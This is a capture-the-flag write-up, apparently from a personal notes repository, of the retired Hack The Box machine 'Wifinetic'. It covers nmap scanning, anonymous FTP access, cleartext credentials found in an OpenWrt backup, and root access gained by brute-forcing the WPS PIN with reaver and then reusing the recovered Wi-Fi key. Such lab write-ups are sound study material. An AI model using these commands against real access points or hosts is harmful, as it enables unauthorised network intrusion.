@@ -1,0 +1,162 @@
+==============================================================================================
+					******** HTB - Machines_(Retired): Wifinetics ********
+===============================================================================================
+I started by running a full NMAP port scan to look for services running on the host with belwo cmd:
+
+** nmap -n -Pn --top-ports=2000 10.10.11.247 --reason --disable-arp-ping
+
+Nmap scan report for 10.10.11.247
+PORT   STATE SERVICE REASON
+
+21/tcp open  ftp     syn-ack
+22/tcp open  ssh     syn-ack
+53/tcp open  domain  syn-ack
+
+Then i did an nmap version scan of the services listening on the host with below command:
+
+** nmap -n -Pn -p21,22,53 -sC -sV 10.10.11.247 --disable-arp-ping
+
+Nmap scan report for 10.10.11.247
+Host is up (0.12s latency).
+
+PORT   STATE SERVICE    VERSION
+21/tcp open  ftp        vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
+| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
+| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
+| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
+|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.14.5
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+53/tcp open  tcpwrapped
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 
+
+=================================================================================================
+-- Host Enummeration:
+=====================
+OS: Ubuntu/Linux
+Services: SSH, FTP, DNS
+
+user emails:
+============
+samantha.wood93@wifinetic.htb		HR Manage
+management@wifinetic.htb
+olivia.walker17@wifinetic.htb		Wireless Network Administrator
+
+user creds:
+===========
+/profile/rpcd:
+** config login
+        option username 'root'
+        option password '$p$root'
+        list read '*'
+        list write '*'
+        
+etc/config/wirless:
+config wifi-iface 'wifinet0'
+        option device 'radio0'
+        option mode 'ap'
+        option ssid 'OpenWrt'
+        option encryption 'psk'
+        option key 'VeRyUniUqWiFIPasswrd1!'
+        option wps_pushbutton '1'
+
+config wifi-iface 'wifinet1'
+        option device 'radio1'
+        option mode 'sta'
+        option network 'wwan'
+        option ssid 'OpenWrt'
+        option encryption 'psk'
+        option key 'VeRyUniUqWiFIPasswrd1!'
+
+=================================================================================================
+-- Exploitation walkthrough:
+============================
+From nmap's version scan result, i could see that the FTP server allows for anonymous login which I
+tried to login as.
+
+On successfull FTP anon login, I downloaded all files. On viewing the files, i could see clear text
+passwords in the etc/config/wireless and in profile/rpcd files.
+
+Nothing this down, the .tar file i expanded, expanded to a etc folder. In the etc folder, I could 
+see passwd, group files which the user 'netadmin' stood out including the root user.
+
+Since we have two possible passwords and two possible users, I tried to login via ssh. Also in the
+other files form the ftp server, I got two vallid employee emails.
+
+The valid logincreds for the SSH service is 'netadmin' with password 'VeRyUniUqWiFIPasswrd1!'
+
+On logging in, i got the user flag in netadmin's home folder.
+
+Next i performed my normal post-exploitation enumeration on the host. There were no SUID files or
+miscoig on passwd files so i focused on the processes running on the machine with the 'ps' cmd.
+
+focusing on what is running on as root, i saw the 'hostapd' process running.
+
+hostapd (host access point daemon) is a user space daemon software enabling a network interface card 
+to act as an access point and authentication server.
+
+Using the 'iwconfig' command, I could see the 'mon0' interface is used in 'monitor' mode.
+
+Since this machie is about abusing wifi networks, I need to escalat my privs via the wifi network.
+
+fist I enum the network interfaces on the host iwth the 'iwconfig' and 'ifconfig' cmd.
+
+I noticed that wlan0 is the wifi AP, wlan1 is a client and mon0 is used for monitioring and testing
+purpose cos it was in 'monitor' mode.
+
+Next, I have to bruteforce the AP PIN so i can get the clear-text password/passphrase.
+
+From one of the files downloade from the FTP server is a .txt file that indicated that the 'reaver'
+tool was installed on the system and used for testng purposes.
+
+We will use this tool to bruteforce the PIN but first, lets enum further the wireless network 
+interface statistics and configs.
+
+I used the 'iw dev' to get the above informaion for the wifi network interfaces.
+
+Attempting to brute force the WPS PIN could potentially lead to obtaining the actual Wi-Fi
+password.
+
+To look for tools that I can use to perform network related activities I used the below command:
+
+** getcap -r / 2>/dev/null
+
+To run a WPS PIN attack, we require the BSSID (Basic Service Set Identifier) of the Access Point AP 
+
+This BSSID uniquely identifies the AP, and having it allows us to target the specific AP for the 
+attack.
+
+** wash -i wlan0 or iw dev			To get BSSID (MAC addr) of the AP we want to bruteforce.
+** reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1			Bruteforce the WPS PIN
+
+output:
+=======
+[+] Pin cracked in 2 seconds
+[+] WPS PIN: '12345670'
+[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
+[+] AP SSID: 'OpenWrt'
+[+] Nothing done, nothing to save.
+
+After getting the AP password, I then used it to login via SSH as the root user. This logged me in
+and I then got the root flag in /root/flag.txt
+
+
+
